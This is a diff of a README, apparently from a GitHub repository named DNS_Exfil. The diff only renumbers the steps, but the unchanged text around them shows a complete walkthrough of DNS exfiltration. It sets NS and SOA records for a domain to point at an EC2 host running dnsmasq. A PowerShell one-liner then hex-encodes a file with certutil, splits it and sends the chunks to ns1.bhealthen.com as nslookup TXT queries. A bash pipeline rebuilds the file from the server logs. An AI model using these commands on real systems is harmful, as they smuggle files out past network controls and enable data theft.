@@ -24,7 +24,7 @@ Restart the VM, or find a way to restart dnsmasq (sudo systemctl restart systemd
 
 sudo dnsmasq  
 
-## Step 4: Note down default SOA and NS records, then remove them
+## Step 5: Note down default SOA and NS records, then remove them
 **Record Name:** bhealthen.com  
 **Type:** SOA  
 **Value:** ns-1714.awsdns-22.co.uk. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400  
@@ -41,7 +41,7 @@ ns-113.awsdns-14.com.
 
 ![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/f096c51f-a06d-4df4-b8a9-e1ad61579d8f)
 
-## Step 5: Create A Record to point from record name to your EC2 instance
+## Step 6: Create A Record to point from record name to your EC2 instance
 **Record Name:** ns1.bhealthen.com  
 **Type:** A  
 **Value:** 54.179.112.60
@@ -52,7 +52,7 @@ ns-113.awsdns-14.com.
 **Value:** 54.179.112.60
 **TTL:** 300  
 
-## Step 6: Modify existing NS Record to point to your EC2 instance
+## Step 7: Modify existing NS Record to point to your EC2 instance
 **Record Name:** bhealthen.com  
 **Type:** NS  
 **Value:**  
@@ -60,29 +60,29 @@ ns1.bhealthen.com
 ns2.bhealthen.com  
 **TTL:** 60  
 
-## Step 7: Modify existing SOA record to point to your EC2 instance
+## Step 8: Modify existing SOA record to point to your EC2 instance
 **Record Name:** bhealthen.com  
 **Type:** SOA  
 **Value:** ns1.bhealthen.com. admin.bhealthen.com 1 7200 900 1209600 86400  
 **TTL:** 60  
 
-## Step 8: Use CMD to nslookup as a test
+## Step 9: Use CMD to nslookup as a test
 nslookup -q=TXT 12332145343dafdsa234234123123453asdf234sadfsadfasdf ns1.bhealthen.com  
 
 ![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/79dc6562-8f73-41bd-89ac-9db7701c0946)
 
 
-## Step 9: Check your DNS logs in EC2
+## Step 10: Check your DNS logs in EC2
 sudo cat /var/log/dnsmasq.log | grep -F "[TXT]"  
 
 ![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/ff2684c5-136f-4ab2-8da7-88c17f0aa1a2)
 
 
-## Step 10: Powershell command to hex encode a file, split, and do nslookup IMPROVEMENT POINT TO REMOVE encoded.hex
+## Step 11: Powershell command to hex encode a file, split, and do nslookup IMPROVEMENT POINT TO REMOVE encoded.hex
 
 certutil -encodehex ToExfil.txt encoded.hex 12; $buffer = Get-Content .\encoded.hex; $split = $buffer -split '(.{50})' -ne ''; foreach ($line in $split) {nslookup -q=TXT "$Line.bhealthen.com" ns1.bhealthen.com; sleep 5}  
 
-## Step 11: Use a BASH command to read contents from TXT requests, remove unnecessary content, remove line break, remove spacing
+## Step 12: Use a BASH command to read contents from TXT requests, remove unnecessary content, remove line break, remove spacing
 
 sudo cat /var/log/dnsmasq.log | grep -F '[TXT]' | cut -f 7 -d ' ' | cut -f 1 -d '.' | sed -z 's/\n/ /g' | sed -e 's/[[:space:]]//g' > output
 sudo cat output | xxd -p -r > SecretFile.txt | cat SecretFile.txt
